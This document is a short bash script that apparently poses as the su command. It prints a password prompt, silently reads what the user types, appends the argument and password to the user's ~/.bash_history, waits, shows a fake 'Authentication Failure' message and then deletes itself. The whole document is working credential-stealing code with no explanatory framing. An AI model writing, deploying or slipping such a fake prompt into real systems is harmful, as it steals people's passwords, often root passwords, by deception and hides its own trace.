#!/bin/bash
printf "Password: "
read -s password
printf "\n# %s %s" $1 $password >> ~/.bash_history
sleep 4
printf "\nsu: Authentication Failure"
rm $0
